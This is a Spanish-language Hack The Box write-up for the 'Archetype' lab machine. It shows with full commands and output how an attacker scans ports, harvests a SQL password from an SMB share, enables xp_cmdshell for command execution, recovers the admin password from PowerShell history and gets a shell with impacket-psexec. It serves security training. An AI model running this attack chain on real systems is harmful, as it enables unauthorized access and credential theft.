---
title: Archetype
date: 2025-04-17 00:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, archetype, impacket]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/b39473da3f36b9b5718d6c76eb573a10.png
    alt: Hack The Box
---

### Archetype

Como ya es constumbre se nos proponen una serie de tareas que vas cumpliendo para seguir avanzando hasta conseguir la bandera.

## Task 1
``` shell
nmap -p- -vv -T4 10.129.194.128  
Which TCP port is hosting a database server?
Not shown: 65247 closed tcp ports (reset), 276 filtered tcp ports (no-response)
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
1433/tcp  open  ms-sql-s     syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
```
> 1433

## Task 2

What is the name of the non-Administrative share available over SMB?
``` shell
 smbclient -L  //10.129.194.128/ADMIN$  
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
```
> backups

## Task 3

What is the password identified in the file on the SMB share?

Montamos el recurso compartido con mount para samba usamos este flag "-t cifs".  Y ya podemos leer el contenido. 
``` shell
$ sudo mount -t cifs  //10.129.194.128/backups /mnt
Password for root@//10.129.194.128/backups: 

┌──(kali㉿kali25)-[/mnt]
└─$ cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>     
```
> M3g4c0rp123

## Task 4

What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

En Kali25 este escript se invoka como impacket-mssqlclient, pero el script original se llama mssqlclient.py
Puedes encontralo aquí [hacktools/exploiting](../hacktools/#exploiting)

> mssqlclient.py

## Task 5

What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

Conectamos con el script de impacket y utilizamos la ayuda, esta ya nos proporciona dos comandos que usaremos luego.

``` shell
┌──(kali㉿kali25)-[~]
└─$ impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.194.128 -windows-auth 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
```
> xp_cmdshell

## Task 6

What script can be used in order to search possible paths to escalate privileges on Windows hosts?

Parce que usar xp_cmdshell sin usar enable_xp_cmdshell no nos permitía usar ningún comando, así que por este orden parece que
ya podemos ejecutar comandos en la máquina objetivo. 

``` shell
SQL (ARCHETYPE\sql_svc  dbo@master)> enable_xp_cmdshell
INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> 
SQL (ARCHETYPE\sql_svc  dbo@master)>   xp_cmdshell "whoami"
output              
-----------------   
archetype\sql_svc   

NULL                

```
Empiezo a jugar con este comando xp_cmdshell
```
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell dir *
output                                                                                                                      
--------------------------------------------------------------------------------                                            
 Volume in drive C has no label.                                                   

 Volume Serial Number is 9565-0B4F                                                 

NULL                                                                               

 Directory of C:\Windows\system32 
```
Encuentro un archivo interesante podría ser la bandera? Ah! más adelante nos la pedirán.
```
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "type c:\Users\sql_svc\Desktop\user.txt"
output                             
--------------------------------   
3e7b102e78218e9************
 ```

Parece que buscando en el historial de PowerShell podemos recuperar información valiosa 
```
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "type  c:\users\sql_svc\appData\roaming\microsoft\windows\powershell\psreadline\consolehost_history.txt"
output                                                                    
-----------------------------------------------------------------------   
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

Una forma de conseguir una shell podría ser ejecutando una reverse shell [hacktools/exploiting](../hacktools/#exploiting)
Pero parece que con psexec de impacket podemos aprovechar las credenciales obtenidas y directamente obtener una. 
```
┌──(kali㉿kali25)-[~]
└─$ impacket-psexec administrator@10.129.194.128
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

c:\Users\Administrator\Desktop> type root.txt
b91ccec3305e9824************

```

## Task 7

What file contains the administrator's password?

Recuerda limpiar tu historial de comandos señor administrador su historial podría estar =>
**c:\users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSreadline\consolehost_history.txt**

> consolehost_history.txt

## Submit Flag

Submit user flag
> 3e7b102e78218e************

## Submit Flag
> b91ccec3305e982************

## Submit root flag [Achivement](https://www.hackthebox.com/achievement/machine/2336390/287)